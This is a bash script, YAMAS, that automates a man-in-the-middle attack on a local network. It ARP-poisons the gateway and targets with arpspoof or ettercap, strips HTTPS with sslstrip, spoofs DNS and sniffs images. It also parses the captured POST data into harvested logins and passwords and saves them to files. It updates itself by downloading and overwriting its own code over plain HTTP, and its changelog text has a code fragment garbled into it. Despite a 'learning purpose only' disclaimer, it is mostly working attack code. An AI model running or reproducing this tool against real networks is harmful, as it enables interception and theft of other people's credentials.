# #!/bin/bash
# Bash script to launch man it the middle attack and sslstrip.
# version 0.9 by comaX
version="20130313"
if [ $UID -ne 0 ]; then
    echo -e "\033[31This program must be run as root.
This will probably fail.\033[m"
    sleep 3
    fi

log_output_dir=~
sslstrip_dir=/usr/share/sslstrip
ask_for_install=y

if [ ! -d "$log_output_dir" ]; then
    mkdir -p $log_output_dir
fi

# if user ^C then execute cleanup function
trap fast_cleanup SIGINT # will prolly output errors, but that's normal since it may try killing non-existing processes.
fast_cleanup() 
{
echo -e "\n\n\033[31m ^C catched. Cleaning up, then exit.\033[m"
if [[ $looparseid != "" ]];then
	kill $looparseid
fi

if [[ $sslstripid != "" ]];then
	kill $sslstripid
fi

if [[ $dnsid != "" ]];then
	kill $dnsid
fi

if [[ $etterspoofid != "" ]];then
kill $etterspoofid
fi

if [[ "$etter" = "1" ]];then
	killall ettercap
else
	killall arpspoof
fi

echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
iptables --flush 			# there are probably too many resets here,
iptables --table nat --flush		# but at least we're sure everything's clean
iptables --delete-chain
iptables --table nat --delete-chain


echo -e "\033[32m[-] Clean up successful !\033[m"
exit 0
}

#Let's define some arguments that can be passed to the script :

#generating grepcred.txt so that it doesn't have to be downloaded each time
#it was originally being downloaded so I could easily fix it, but there has
#been no fix to be done... So why use a file instead of a command line ?
#It's just much more easier this way.
echo -e "credential\nemail\nlast\nlog\nmodified\nname\nnickname\npass\npersistent\npw\nsession\ntextbox\nuser\nwebsite" > /tmp/grepcred.txt
while [ "$1" != "" ];do
case $1 in
	-p | --parse) 
		if [[ $2 == "" ]]; then 
			echo -e "No input file given. Quitting. \nusage : $0 -p <file>"
			exit 0
		fi
	clear
	echo -e "Parsing $2 for credentials.\n\n"
	cat $2 |
	awk -F "(" '/POST Data/ {for (i=1;i<=NF;i++) if (match($i,/POST Data/)) n=i; print "Website = \t"$2; getline; print $n"\n"}' |
	awk -F "&" '{for(i=1;i<=NF;i++) print $i }' |
	egrep -i -a -f /tmp/grepcred.txt |
	awk -F "=" '{if (length($2) < 4) print "";
	else if ($1 ~/Website/) print $0;
	else if ($1 ~/[Pp]/) print "Password = \t"$2"\n";
	else if ($1 ~/available/) print "";
	else if ($1 ~/last/) print "";
	else print "Login = \t"$2}' |
	uniq
	exit 0 ;;
	
	-pl) while :
	do
	clear
	echo -e "Parsing $2 for credentials.\n\n"
	cat $2 |
	awk -F "(" '/POST Data/ {for (i=1;i<=NF;i++) if (match($i,/POST Data/)) n=i; print "Website = \t"$2; getline; print $n"\n"}' |
	awk -F "&" '{for(i=1;i<=NF;i++) print $i }' |
	egrep -i -a -f /tmp/grepcred.txt |
	awk -F "=" '{if (length($2) < 4) print "";
	else if ($1 ~/Website/) print $0;
	else if ($1 ~/[Pp]/) print "Password = \t"$2"\n";
	else if ($1 ~/available/) print "";
	else if ($1 ~/last/) print "";
	else print "Login = \t"$2}' |
	uniq
	sleep 3
	done ;;

	-e | --etter) echo -e "\tYou will be using Ettercap instead of ARPspoof."
	etter="1"
	shift
	sleep 0.5 ;;

	-h | --help) clear 
	echo -e "You are running $0, version $version.


usage : $0 -h -c -p -e -s -f
	-h or --help  :	Display this help message, disclaimer and exit.
	-c or --change: Display changelog and todo.	
	-e :	Use ettercap instead of ARPspoof. One might have one's reasons...
			ARPspoof is default.
	-p or --parse :	Only parse the given <file>. Don't use wildcards.
			Use > /output_file to print to a file.
	-s : Stealth mode. The script won't download anything.
	-f : Use a padlock favicon in sslstrip.
	
\033[31m DISCLAIMER :\033[m
This program is intended for learning purpose only. I do not condone hacking 
and wouldn't be held responsible for your actions. Only you would face legal
consequences if you used this script for illegal activities.

\033[31m What I think should be learnt from this script :\033[m
This script should teach you how easy it is to steal sensitive online
credentials and how to protect you from it, provided you understand
what this program does. The best way to understand what it does is
to look at its source. This will also teach you basic shell scripting."
exit 0 ;;

	-c | --change)
	clear
	echo -e "\033[31m Changelog :\033[m
ToDo :
- FakeSSL -> Need help

\033[31mFeatures :\033[m
- Output of credentials as they are sniffed in xterm window.
- Log parsing for user-friendly output.
- Both arpspoof and ettercap are suported
- Network mapping for host discovery.
- Can save \"dumped\" passwords to file.
- Support for multiple targets on the network.
- Can parse a single file.
- Display ASCII tables for better readability of creds.
- All options know default, pressing only enter should get you through.
- Very neat and kewl ascii =D
- Miscellaneous features

\033[31m Credits :\033[m
Credits go to all people on backtrack forums for their help and support,
and google for being my best friend with scripting.
Special kudos to ShortBuss for something I should have seen a
long time ago (sslstrip before arpspoof) and many little improvements.
And of course, to thif [[ $2 == "" ]]; then 
			echo -e "No input file given. Quitting. \nusage : $0 -p <file>"
			exit 0
		fie people responsible for the tools I am using in this script.

Please criticize this program or submit ideas on the official thread at
http://tinyurl.com/yamas-bt5 or send me a mail at contact.comax@gmail.com"
	exit ;;

	-s | --silent)
	echo "Stealth mode ON"
	silent="1"
	shift ;;

	-f | --fav)
	echo "favicon mode ON"
	fav="-f"
	shift ;;

	-t)
	time="$4" ;;

	*) shift ;;
esac

done

### Message of the day ! <= Fucking useless, but who knows, I might want to warn about something directly, or tell a joke...
if [[ "$silent" = "1" ]]; then
	message="\nNo message to display : you are running in silent mode"
else
	message=$(curl --silent -q http://comax.fr/yamas/bt5/message) #store it to variable
fi

if [[ $1 = "-s" || $2 = "-s" ]]; then
	echo "ASCII tables won't be available."
	echo "ASCII tables are not available due to the use of silent mode." > /tmp/ascii
else
	wget -q http://comax.fr/yamas/bt5/ascii -O /tmp/ascii
fi

### Check for updates !
if [[ "$silent" = "1" ]];then
	echo "Not checking for a new version : silent mode."
else
	changelog=$(curl --silent -q http://comax.fr/yamas/bt5/changelog)
	last_version=$(curl --silent -q http://comax.fr/yamas/bt5/version) #store last version number to variable
	if [[ $last_version > $version ]];then # Comparing to current version
		echo -e "You are running version \033[31m$version\033[m, do you want to update to \033[32m$last_version\033[m? (Y/N)
Last changes are :
$changelog"
		read update
		if [[ $update = Y || $update = y ]];then
			echo "[+] Updating script..."
			wget -q http://comax.fr/yamas/bt5/yamas.sh -O $0
			chmod +x $0
			echo "[-] Script updated !"
			if [[ $0 != '/usr/bin/yamas' && $ask_for_install = 'y' ]];then
				echo -e "Do you want to install it so that you can launch it with \"yamas\" ?"
				read install
				if [[ $install = Y || $install = y ]];then #do not proceed to install if using installed version : updating it already "installed" it over.
					cp $0 /usr/bin/yamas
					chmod +x /usr/bin/yamas
					echo "Script should now be installed, launching yamas !"
					sleep 3
					yamas
					exit 1
				else
					echo "Ok, continuing with updated version..."
					sleep 3
					$0
					exit 1
				fi
			fi
		
		sleep 2
		$0
		exit 1
		else
			echo "Ok, continuing with current version..."
		fi
	else
		echo "No update available"
	fi
fi
### End of update process

### Install process
if [[ ! -e '/usr/bin/yamas' && $ask_for_install = 'y' ]];then
	echo "Script is not installed. Do you want to install it ? (Y/N)"
	read install
	if [[ $install = Y || $install = y ]] ; then
		cp -v $0 /usr/bin/yamas
		chmod +x /usr/bin/yamas
		rm $0
		echo "Script should now be installed. Launching it !"
		sleep 3
		yamas
		exit 1
	else
		echo "Ok, not installing then !"
	fi
else
	echo "Script is installed"
	sleep 1
fi
### End of install process

clear
echo -e "
                                                               
     \`YMM'   \`MM'   db      \`7MMM.     ,MMF'      db       .M\"\"\"bgd 
       VMA   ,V    ;MM:       MMMb    dPMM       ;MM:     ,MI    \"Y 
        VMA ,V    ,V^MM.      M YM   ,M MM      ,V^MM.    \`MMb.     
         VMMP    ,M  \`MM      M  Mb  M' MM     ,M  \`MM      \`YMMNq. 
          MM     AbmmmqMA     M  YM.P'  MM     AbmmmqMA   .     \`MM 
          MM    A'     VML    M  \`YM'   MM    A'     VML  Mb     dM 
        .JMML..AMA.   .AMMA..JML. \`'  .JMML..AMA.   .AMMA.P\"Ybmmd\" " # <= I love it.
echo -e "===========================================================================
=\033[31m       Welcome to Yet Another MITM Automation Script.\033[m                    =
=\033[31m       Use this tool responsibly, and enjoy!\033[m                             =
=       Feel free to contribute and distribute this script as you please. =
=       Official thread : http://tinyurl.com/yamas-bt5                    =
=       Check out the help (-h) to see new features and informations      =
=       You are running version \033[32m$version\033[m                    		  =
==========================================================================="
echo -e "\033[36mMessage of the day :\033[m"
echo -e "$message"
echo

# Starting fresh : reset IP forward and iptables
echo -e "\033[31m [+] Cleaning iptables \033[m"
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "[-] Cleaned."

# Defining exit function and other ending features
cleanup()
{
echo
echo -e "\033[31m[+] Killing processes and resetting iptable.\033[m"
kill $sslstripid
kill $looparseid

if [[ $drifton = 1 ]]; #if driftnet was used 
      then
	  echo -e "\033[31mIMMA KILL THIS DRIFTNET BITCH\033[m" #It's between him and me.
	      if [[ ! -e $log_output_dir/capture_$(date +%d%m%y) ]]; #check if destination folder exists, since driftnet won't create one nor save images
		  then
		  mkdir $log_output_dir/capture_$(date +%d%m%y) #create if needed
	      fi
	  cp /tmp/driftnet* $log_output_dir/capture_$(date +%d%m%y) #copy all content from driftnet's temp folder to destination
	  killall driftnet #kill the unbeliever
	  elif [[ $drifton = 2 ]]; #if tcpxtract was used
	  then
	  killall tcpxtract  #kill it...
fi

if [[ "$etter" = "1" ]];then
	killall ettercap
else
	killall arpspoof
fi

echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
iptables --flush 			# there are probably too many resets here,
iptables --table nat --flush		# but at least we're sure everything's clean
iptables --delete-chain
iptables --table nat --delete-chain
echo -e "\033[32m[-] Clean up successful !\033[m"
echo -e "\nDo you want to keep the whole log file for further use or shall we delete it? (Y=keep)"
echo "(If you want to keep it, it will be stored in $log_output_dir/$filename.txt)"
read -e keep
if [[ $keep = "Y" || $keep = "y" ]];then # double brackets because double condition. || signifies "or"
	cp /tmp/$filename.txt $log_output_dir/$filename.txt #moving file
	if [ -f "$log_output_dir/$filename.txt" ]; then #check if it exists
		echo "Log file copied !" #it does
		else echo "Error while copying log file. Go check /tmp/ for $filename.txt" #it does not
	fi
else
	echo "Logs not saved"
fi

echo -e "\nDo you want to save passwords to a file? (Y=keep)"
echo "(If you want to keep it, it will be saved in $log_output_dir/$filename.pass.txt)"
read -e keeppd
if [[ $keeppd = "Y" || $keeppd = "y" ]];then # double brackets because double condition. || signifies "or"
	cat /tmp/$filename.txt |
	awk -F "(" '/POST Data/ {for (i=1;i<=NF;i++) if (match($i,/POST Data/)) n=i; print "Website = \t"$2; getline; print $n"\n"}' |
	awk -F "&" '{for(i=1;i<=NF;i++) print $i }' |
	egrep -i -a -f /tmp/grepcred.txt |
	awk -F "=" '{if (length($2) < 4) print "";
	else if ($1 ~/Website/) print $0;
	else if ($1 ~/[Pp]/) print "Password = \t"$2"\n";
	else print "Login = \t"$2}' |
	uniq >> $log_output_dir/$filename.pass.txt # >> appends to a potential previous file.
	if [ -f "$log_output_dir/$filename.pass.txt" ]; then #check if it exists
		echo "Passwords saved !" #it does
	else
		echo "Error while saving passwords" #it does not
	fi
else
	echo "Password saving skipped."
fi

rm /tmp/$filename.txt
echo -e "\nTemporary files deleted."
exit
}

search=$(ip route show | awk '(NR == 2) { print $1}') #store gateway/24 for whole network mapping to variable
#We put it here in the middle, because it could be used two times, but the gateway shouldn't change,
#so there is no need to do it twice.

rescan ()
{
echo -e "\033[31m"
nmap -sn $search | grep report | awk -F for '{ print $2 }' #host discorvey
echo -en "\033[m"
final
}

add_target()
{
echo "Enter a new IP adress to attack :"
read newip
xterm -geometry 90x3-1-1 -T "Poisoning $newip" -e arpspoof -i $iface -t $newip $gateway 2>/dev/null & sleep 2
final
}

ascii()
{
clear
cat /tmp/ascii
rm /tmp/ascii
final
}

dns_spoof()
{

### Make Host function###
	mkhst() 
	{
	echo "Enter your redirection list line by line. End with #.
Usage is : 127.0.0.1 foo.bar.com
Wildcards may be used."
	if [ -e '~/hosts_spoof']; then 
	rm ~/hosts_spoof
	fi
	while :
	do
		read input
		echo "$input" >> ~/hosts_spoof
		if [[ $input == "#" ]];then
			break
		fi
	done
	}

###EOfunc###
echo "If you already have a host file, enter its path. If you don't, press enter."
read gothost
if [[ $gothost != "" ]];then
	echo "Host file $gothost will be used."
else
	echo -e "We'll make one...\n"
	mkhst
fi

xterm -geometry 90x3-1-1 -T "DNS spoofing" -e dnsspoof -i $iface -f ~/hosts_spoof & dnsid=$!
}

choose_dns()
{
echo "Would you like to use Ettercap 'dns_spoof' plugin or dnsspoof (E/D) ? Press a to abort"
read spoofpgm
case $spoofpgm in
	E) echo "We'll use ettercap. Make sure to have edited /usr/share/ettercap/etter.dns"
	ettercap -D -q -i $iface -T -P dns_spoof & etterspoofid=$! ;;
	
	D) echo "We'll use dnsspoof."
	dns_spoof ;;

	a | A) final ;;

	*) echo "Wrong choice. Please use E or D"
	choose_dns;;
esac

final
}

misc()
{
echo -e "\nHere are the miscellanous features.
1. Image sniffing
2. DNS spoofing
3. Previous menu."
read misc
case $misc in
	1) image_menu
	   final ;;
	2) choose_dns ;;
	3) final ;;
	*) echo "bad choice"
	  misc ;;
esac
}

image_menu()
{
echo -e "Would you rather use driftnet (display images) or tcpxtract ?
1. Tcpxtract (saves all images to $log_output_dir/capture[date])
2. Driftnet (Display images on screen and save all images to $log_output_dir/capture[date])"
read image_choice
case $image_choice in 
	1) tcpxtract -d $iface -o $log_output_dir/capture_$(date +%d%m%y) > /dev/null & tcpid=$!
	   drifton=2 
	   echo "tcpxtract is launched with pid $tcpid"
	   misc ;;
	2) 	   driftnet -i $iface -d /tmp/ &> /dev/null &
	   drifton=1
	   echo "Driftnet launched." 
	   misc ;;
esac
}

rtparse()
{
echo -e "\n\nIn this menu, you can pause, resume, kill, or launch
realtime parsing (RTP).
1. Pause RTP (keep xterm open for you to read, copypasta, etc.)
2. Resume RTP.
3. Kill RTP (stop and close xterm)
4. Re-launch RTP
5. Previous menu."
read rtp
case $rtp in # not sure if this should be quote enclosed...anyone want to help out?  It's singular options without a space, so I think the need for quotes is NOT needed??
	1) echo -e "\033[33m[+]Pausing...\033[m"
	kill -19 $looparseid
	echo -e "\033[33m[-]Paused.\033[m"
	rtparse;;

	2) echo -e "\033[33m[+]Resuming...\033[m"
	kill -18 $looparseid
	echo -e "\033[33m[-]Resumed.\033[m"
	rtparse;;

	3) echo -e "\033[31m[+]Killing...\033[m"
	kill $looparseid
	echo -e "\033[33m[-]Killed.\033[m"
	rtparse;;

	4) echo -e "\033[32m[+]Launching...\033[m"
	xterm -hold -geometry 90x20-1-100 -T Passwords -e $0 -pl /tmp/$filename.txt & looparseid=$!
	sleep 2
	echo -e "\033[33m[-]Launched.\033[m"
	rtparse;;

	5) echo "Previous"
	final ;;

	*) echo -e "\033[31mBad choice bro !\033[m\n" #Professional Language =)
	rtparse;;
esac
}

final()
{
echo -e "\n\033[32mAttack is running\033[m. You can :
1. Rescan network.
2. Add a target (useless if targeting whole network).
3. Display ASCII correspondence table.
4. Real-time parsing...
5. Misc features.
6. Quit properly.

Enter the number of the desired option."
read final
case $final in
	1) rescan ;;

	2) add_target ;;

	3) ascii ;;

	4) rtparse ;;

	5) misc ;;

	6) cleanup ;;

	*) echo -e "\033[31mBad choice bro !\033[m\n" #was "motherfucker" during my tests.
	final ;;
esac
}

###############################End of functions#############################

# IP forwarding
echo
echo -e "\033[31m [+] Activating IP forwarding... \033[m"
echo "1" > /proc/sys/net/ipv4/ip_forward
echo "[-] Activated."

#Iptables
echo
echo -e "\033[31m [+] Configuring iptables... \033[m"
echo -en "\033[31m To \033[mwhat port should the traffic be redirected to? (default = 8080)"
echo
read -e outport
if [ "$outport" = "" ];then
	outport=8080
	echo -e "Port $outport selected as default.\n"
fi

echo -en "\033[31m From \033[mwhat port should the traffic be redirected to? (default = 80)"
echo
read -e inport
if [ "$inport" = "" ];then
	inport=80
	echo -e "Port $inport selected as default.\n"
fi

echo -e "\n\033[33m Traffic from port $inport will be redirected to port $outport \033[m"
iptables -t nat -A PREROUTING -p tcp --destination-port $inport -j REDIRECT --to-port $outport
echo "[-] Traffic rerouted"

#Sslstrip
echo
echo -e "\033[31m [+] Activating sslstrip... \033[m"
echo  "Choose filename to output : (default = yamas)"
read -e filename
if [ "$filename" = "" ];then
	filename="yamas"
fi

echo -e "\033[33m Sslstrip will be listening on port $outport and outputting log in /tmp/$filename.txt\033[m"

if [ ! -e '/usr/bin/sslstrip' ];then # If sslstrip isn't installed
	if [ ! -x '$sslstrip_dir/sslstrip.py' ];then #if non-installed is not executable
		chmod +x $sslstrip_dir/sslstrip.py #make it executable
	fi
	$sslstrip_dir/sslstrip.py $fav -a -k -l $outport -w /tmp/$filename.txt 2> /dev/null & sslstripid=$! #launch non-installed
else
	sslstrip $fav -a -k -l $outport -w /tmp/$filename.txt 2> /dev/null & sslstripid=$!
fi

sleep 4 #let time for sslstrip to launch. Might be bit too much, but better prevent than heal.
echo
echo -e " [-] Sslstrip is running." # a bit redundant, but who cares?
echo

#Arpspoofing
echo
echo -e "\033[31m [+] Activating ARP cache poisoning... \033[m"
echo
ip route show | awk '(NR == 1) { print "Gateway :", $3,"    ", "Interface :", $5}' #Output IP route show user-friendly
iface=$(ip route show | awk '(NR == 1) { print $5}')
gateway=$(ip route show | awk '(NR == 1) { print $3}') #store gateway ip
echo
echo "Enter IP gateway adress or press enter to use $gateway."
read -e gateway
if [ "$gateway" = "" ];then
	gateway=$(ip route show | awk '(NR == 1) { print $3}') #restore gateway ip since pressing enter set our var to null
	echo -e "$gateway selected as default.\n"
fi

echo
echo "What interface would you like to use? It should match IP gateway as shown above. Press enter to use $iface."
read -e iface
if [ "$iface" = "" ];then
	iface=$(ip route show | awk '(NR == 1) { print $5}') #store default interface
	echo -e "$iface selected as default.\n"
fi

echo -e "\r"
echo -e "We will target the whole network as default. You can \033[4md\033[miscover hosts and enter IP(s) manually by entering \033[4mD\033[m.
Press enter to default."
read -e choicearp
echo
if [[ $choicearp = "D" || $choicearp = "d" ]];then
	echo -e "\nDo you want to map the network to show live hosts? (Y/N)	[This might take up to 30 secs, be patient]"
	read -e hosts
	echo -e "\033[31m "
	if [[ $hosts = "Y" || $hosts = "y" ]];then
		nmap -sn $search | grep report | awk -F for '{ print $2 }' #host discovery
		echo -e "\033[m " # switch color back to white
	else
		echo -e "\033[m "
	fi
	echo -e "Please enter targets according to usage : IP1 IP2 IP3...
\033[31m Beware ! This will spawn as many windows as input targets and might slow down performances. If that was the case, then use whole network targeting.\033[m "
	arpspoofi()
	{ # We launch ARPspoof in different xterm windows to keep script running
	while [ "$1" != "" ];do
		xterm -geometry 90x3-1-1 -T "Poisoning $1" -e arpspoof -i $iface -t $1 $gateway 2>/dev/null & sleep 2
		shift 
	done

	echo -e "\033[33m Targeting $parameters on $gateway on $iface with ARPspoof\033[m"
	}

	ettercapi()
	{ # We launch ARPspoof in different xterm windows to keep script running
	while [ "$1" != "" ];do
		xterm -geometry 90x3-1-1 -T "Poisoning $1" -e ettercap -o -q -i $iface -T -M arp  /$gateway/ /$1/ 2>/dev/null & sleep 2
		shift
	done

	echo -e "\033[33m Targeting $parameters on $gateway on $iface with Ettercap\033[m"
	}

	read -e parameters
	if [[ "$etter" = "1" ]];then
		ettercapi $parameters
	else
		arpspoofi $parameters
	fi

else 
	if [[ "$etter" = "1" ]];then
		xterm -geometry 90x3-1-1 -T ettercap -e ettercap -o -q -i $iface -T -M arp  // // &
		sleep 2
		echo -e "\033[33m Targeting the whole network on $gateway on $iface with Ettercap\033[m"
	else
		xterm -geometry 90x3-1-1 -T arpspoof -e arpspoof -i $iface $gateway &
		sleep 2
		echo -e "\033[33m Targeting the whole network on $gateway on $iface with ARPspoof\033[m"
	fi
fi

echo -e "[-] Arp cache poisoning is launched. \033[31m Keep new window(s) running. \033[m"
echo -e "\n\033[32m Attack should be running smooth, enjoy.\033[m"
xterm -hold -geometry 90x20-1-100 -T Passwords -e $0 -pl /tmp/$filename.txt & looparseid=$! #here's the beauty
sleep 2
final #call the "final" function. Yes, it's the final one.
### End of the script fellas. 
